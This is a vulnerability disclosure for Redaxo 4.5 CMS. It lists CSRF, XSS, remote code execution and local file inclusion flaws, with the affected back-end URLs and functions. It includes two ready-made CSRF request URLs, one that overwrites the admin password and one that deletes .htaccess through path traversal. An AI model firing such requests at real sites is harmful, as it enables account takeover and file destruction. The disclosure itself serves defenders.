Subject: Vulnerabilities in Redaxo 4.5 CMS

The following vulnerabilities have been found in Redaxo 4.5 (http://redaxo.org), an open source CMS for small and medium websites.

CSRF:
Redaxo has no CSRF protection and occasionally accepts GET variables in place of POST, which can be exploited to overwrite user passwords or delete files by an unsuspecting authenticated user.
* /redaxo/index.php?page=user&subpage=&user_id=1&save=1&username=admin&userpsw=admin&useradmin=1&userstatus=1&FUNC_UPDATE=Benutzer%20speichern
* /redaxo/index.php?page=import_export&subpage=import&function=delete&impname=.\..\..\..\.htaccess (Windows only)

XSS:
The following XSS in the Redaxo back-end can be exploited to hijack sessions of authenticated users.
* /redaxo/index.php?page=mediapool&a256_media_name=[XSS]
* /redaxo/index.php?page=structure&mode=[XSS]
* /redaxo/index.php?page=tinymce&subpage=settings&func=update&excludecats=[XSS]

RCE:
Authenticated users with access to the import/export module can execute arbitrary code on the server.
* /redaxo/index.php?page=import_export&subpage=export (Allows creation of .php.* files on server)
* /redaxo/index.php?page=import_export&subpage=import (Allows upload of .php files)
* The function rex_mediapool_filename() in "redaxo/functions/function_rex_mediapool.inc.php" fails to properly sanitize multiple file name extensions, which can be exploited to upload arbitrary code via the image manager (Apache AddHandler)

LFI in Redaxo-Addon tinymce:
* PHP function tinymce_generate_image() in "redaxo/include/addons/tinymce/functions/functions.inc.php" fails to properly sanitize file names. This has recently been fixed, but not been made public.
